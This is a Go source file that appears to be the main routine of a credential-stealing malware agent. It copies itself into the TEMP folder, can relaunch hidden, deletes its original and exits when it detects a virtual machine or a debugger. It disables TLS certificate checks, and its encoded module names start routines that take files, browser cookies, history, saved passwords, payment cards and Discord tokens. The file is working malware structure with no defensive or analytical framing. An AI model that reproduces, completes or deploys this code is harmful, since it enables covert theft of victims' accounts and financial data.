package main

import (
	"agent/lib"
	"agent/modules"
	"agent/vars"
	"crypto/tls"
	"log"
	"net/http"
	"os"
	"path"
	"sync"
	"syscall"
)

func SelfExec() (bool, error) {
	self, err := os.ReadFile(os.Args[0])
	if err != nil {
		return true, err
	}

	name := lib.GetMD5(self)[:10] + ".exe"
	cur := path.Base(os.Args[0])
	if cur == name {
		return true, nil
	}

	dst := path.Join(os.Getenv("TEMP"), name)
	err = lib.CopyFile(os.Args[0], dst)
	if err != nil {
		return true, err
	}

	var sI syscall.StartupInfo
	var pI syscall.ProcessInformation
	args := syscall.StringToUTF16Ptr(dst)
	if lib.Cfg.Quiet {
		err = syscall.CreateProcess(
			nil,
			args,
			nil,
			nil,
			false,
			0x08000000,
			nil,
			nil,
			&sI,
			&pI)
	} else {
		err = syscall.CreateProcess(
			nil,
			args,
			nil,
			nil,
			true,
			0,
			nil,
			nil,
			&sI,
			&pI)
	}

	if err != nil {
		return true, err
	}

	return false, nil
}

func main() {
	log.SetFlags(0)
	err := lib.ReadConfig()

	if err != nil {
		lib.Print(vars.Msg_CfgErr, err.Error())
		os.Exit(0)
	}

	lib.Print(vars.Msg_CfgSuc)

	cont, err := SelfExec()
	if err != nil {
		lib.Print(vars.Msg_Exec, err.Error())
	}

	if !cont {
		os.Exit(0)
	}

	err = lib.SelfDelete()
	if err != nil {
		lib.Print(vars.Msg_DelErr, err.Error())
	}

	if lib.Cfg.AntiVM {
		if lib.CheckVM() {
			lib.Print(vars.Msg_VMFail)
			os.Exit(0)
		}
	}

	if lib.Cfg.AntiDebug {
		if lib.CheckDebug() {
			lib.Print(vars.Msg_DebugFail)
			os.Exit(0)
		}
	}

	var wg sync.WaitGroup
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
	}
	modules.GetSystemInfo()

	for _, m := range lib.Cfg.Modules {
		lib.Print(vars.Msg_ModuleLoad, m)
		switch m {
		case lib.Decode(vars.Module_error):
			go modules.DisplayError(&wg)
			wg.Add(1)
		case lib.Decode(vars.Module_files):
			wg.Add(1)
			go modules.GetFiles(&wg)
		case lib.Decode(vars.Module_cookie):
			wg.Add(1)
			go modules.GetCookies(&wg)
		case lib.Decode(vars.Module_history):
			wg.Add(1)
			go modules.GetHistory(&wg)
		case lib.Decode(vars.Module_password):
			wg.Add(1)
			go modules.GetPasswords(&wg)
		case lib.Decode(vars.Module_card):
			wg.Add(1)
			go modules.GetCards(&wg)
		case lib.Decode(vars.Module_discord):
			wg.Add(1)
			go modules.GetDiscord(&wg)
		}
	}

	wg.Wait()
}
